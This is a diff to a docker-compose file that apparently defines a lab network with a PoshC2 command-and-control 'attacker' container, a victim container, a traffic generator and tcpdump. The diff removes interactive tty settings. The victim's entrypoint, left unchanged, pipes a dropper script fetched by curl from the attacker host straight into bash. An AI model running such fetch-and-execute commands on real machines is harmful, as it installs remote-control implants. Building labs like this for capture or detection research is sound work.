@@ -2,8 +2,6 @@ version: "3.9"
 services:
   attacker:
     image: goggles/poshc2
-    stdin_open: true
-    tty: true
     ports:
       - "443:443"
       - "8000:8000"
@@ -12,16 +10,12 @@ services:
     depends_on:
       - attacker
     image: python:2
-    stdin_open: true
-    tty: true
     entrypoint: [ "bash", "-c", "sleep 30; curl 172.18.0.2:8000/py_dropper.sh | bash; tail -f /dev/null" ]
 
   machine:
     depends_on:
       - attacker
     image: traffic-generator:latest
-    stdin_open: true
-    tty: true
     entrypoint: [ "bash", "-c", "python /web-traffic-generator/gen.py" ]
 
   tcpdump:
